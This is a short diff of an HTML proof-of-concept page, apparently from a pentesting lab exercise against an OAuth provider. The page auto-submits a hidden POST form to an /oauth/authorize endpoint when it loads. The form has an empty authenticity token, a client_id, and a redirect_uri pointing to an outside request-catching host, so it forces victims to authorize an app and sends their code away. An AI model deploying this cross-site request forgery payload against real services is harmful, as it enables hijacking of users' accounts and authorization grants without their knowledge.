@@ -1,6 +1,6 @@
 <html>
-  <body onload="document.forms[0].submit()"
-<form action="http://authorization-ptl-df6521cb-867e48b1.libcurl.so//oauth/authorize" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="" />
+  <body onload="document.getElementById('csrf').submit()"
+<form action="http://authorization-ptl-df6521cb-867e48b1.libcurl.so//oauth/authorize" accept-charset="UTF-8" id="csrf" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="" />
       <input type="hidden" name="client_id" id="client_id" value="50e5d79b1b2dd15f9341fd7073b093b2990c8e6586d7981cda53af6ce86ce08c" />
       <input type="hidden" name="redirect_uri" id="redirect_uri" value="https://irfan.free.beeceptor.com" />
       <input type="hidden" name="state" id="state" />
